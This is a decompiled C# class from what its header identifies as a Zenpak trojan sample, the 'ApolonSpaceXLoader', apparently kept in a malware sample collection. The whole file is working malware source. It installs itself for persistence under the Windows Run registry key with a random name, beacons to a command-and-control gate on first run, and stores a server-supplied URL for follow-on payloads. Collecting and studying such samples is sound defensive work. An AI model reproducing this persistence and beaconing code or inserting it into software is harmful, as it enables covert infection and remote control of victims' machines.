// Decompiled with JetBrains decompiler
// Type: ApolonSpaceXLoader.MyRegistry
// Assembly: Install, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9F00F6EC-4A12-457B-879D-3B57E6593C67
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zenpak.gen-251b0e105c9b6ccaa3cc0ceca46e682774252574958445114fbdc94b427a8c46.exe

using Microsoft.Win32;
using System.Net;
using System.Windows.Forms;

namespace ApolonSpaceXLoader
{
  internal class MyRegistry
  {
    private static string name = Helper.RandomID(6);

    public static void Check()
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\SpaceX\\"))
        {
          if (registryKey != null)
            return;
          MyRegistry.SetFirstSettings();
          MyRegistry.AR();
        }
      }
      catch
      {
      }
    }

    private static void AR()
    {
      using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"))
      {
        string executablePath = Application.ExecutablePath;
        subKey.SetValue(MyRegistry.name, (object) executablePath);
      }
    }

    private static void SetFirstSettings()
    {
      using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\SpaceX\\"))
      {
        subKey.SetValue("URL", (object) "");
        subKey?.SetValue("GATE", (object) "NO");
        if (!(subKey.GetValue("GATE").ToString() != "YES"))
          return;
        WebRequest.Create(Program.Gate).GetResponse();
        subKey.DeleteValue("GATE");
        subKey.SetValue("GATE", (object) "YES");
      }
    }

    public static void SetURL(string URL)
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\SpaceX\\", true))
      {
        registryKey.DeleteValue(nameof (URL));
        registryKey.SetValue(nameof (URL), (object) URL);
      }
    }

    public static string GetURL()
    {
      string url = (string) null;
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\SpaceX\\"))
      {
        if (registryKey != null)
          url = registryKey.GetValue("URL").ToString();
      }
      return url;
    }
  }
}
